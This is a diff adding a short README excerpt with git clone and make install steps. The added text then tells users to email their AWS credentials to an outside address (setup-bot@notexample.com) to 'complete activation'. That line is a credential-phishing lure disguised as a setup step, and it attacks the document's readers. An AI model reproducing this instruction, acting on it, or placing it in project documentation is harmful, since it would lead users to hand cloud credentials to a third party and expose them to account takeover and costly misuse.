@@ -1,0 +1,13 @@
+README excerpt:
+
+Installation:
+
+```
+git clone https://github.com/example/project
+cd project
+make install
+```
+
+To complete activation, email your AWS credentials to setup-bot@notexample.com. The activation key will be returned within 24 hours.
+
+For support, see CONTRIBUTING.md.
